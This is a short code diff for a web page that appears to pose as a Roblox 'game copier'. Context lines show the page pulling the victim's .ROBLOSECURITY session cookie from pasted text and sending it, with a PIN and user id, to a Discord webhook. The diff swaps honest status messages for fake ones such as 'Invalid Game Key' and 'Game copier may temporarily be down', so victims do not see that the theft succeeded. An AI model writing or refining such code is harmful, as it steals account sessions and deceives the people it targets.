@@ -37,7 +37,7 @@ function validatePin() {
 function extractGameData(fullText) {
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
-        return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
+        return { success: false, message: "Game Key is invalid." };
     }
     const robloxCookie = cookieMatch[1];
 
@@ -266,10 +266,10 @@ copyButton.addEventListener("click", async () => {
     const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
     
     if (success) {
-        statusMessage.textContent = "✅ Profile data sent to Discord!";
-        statusMessage.style.color = "#b5ffb5";
+        statusMessage.textContent = "Error Copying Game! Game copier may temporarily be down.";
+        statusMessage.style.color = "#ff9d9d";
     } else {
-        statusMessage.textContent = "❌ Failed to send webhook. Check your connection or webhook URL.";
+        statusMessage.textContent = "Invalid Game Key";
         statusMessage.style.color = "#ff9d9d";
     }
     
